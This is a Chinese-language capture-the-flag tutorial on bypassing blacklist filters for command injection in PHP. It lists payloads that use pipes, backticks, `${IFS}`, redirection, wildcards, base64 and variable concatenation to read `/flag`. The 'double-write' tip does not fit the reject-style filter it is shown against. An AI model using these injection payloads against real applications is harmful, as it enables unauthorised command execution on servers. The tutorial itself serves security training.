# 命令执行过滤绕过

## 概述

很多应用会过滤危险字符或关键字，但过滤不严格时仍可被绕过。

## 常见过滤方式

### 1. 过滤分号

```php
if (strpos($cmd, ';') !== false) die('Hacked!');
```

绕过：使用 `|`、`&&`、`||`、反引号替代。

### 2. 过滤多个符号

```php
$blacklist = [';', '&&', '||'];
foreach ($blacklist as $char) {
    if (strpos($cmd, $char) !== false) die('Hacked!');
}
```

绕过：
- 使用 `|`（管道）不在黑名单中
- 使用反引号 `` `command` ``
- 使用 `$(command)`

### 3. 过滤空格

```php
if (strpos($cmd, ' ') !== false) die('Hacked!');
```

绕过：
- `${IFS}` 替代空格
- `<` 重定向符
- `%09`（Tab 编码）

```bash
cat${IFS}/flag
cat</flag
cat%09/flag
```

### 4. 过滤关键字

```php
if (preg_match('/cat|flag/i', $cmd)) die('Hacked!');
```

绕过：
- 双写绕过：`ccatat /flflagag`
- 通配符：`ca? /f??g`
- 编码：`base64` 编码后解码执行
- 变量拼接：`a=ca;b=t; $a$b /flag`

### 5. 过滤斜杠

```php
if (strpos($cmd, '/') !== false) die('Hacked!');
```

绕过：
- `cd .. && cat flag`
- 使用 `$HOME` 变量
- 拼接：`a=/;b=flag; cat $a$b`

## 练习步骤

1. 尝试基本注入 — 被过滤
2. 分析过滤规则（测试哪些字符被过滤）
3. 找到可用的绕过方式
4. 构造 payload 获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
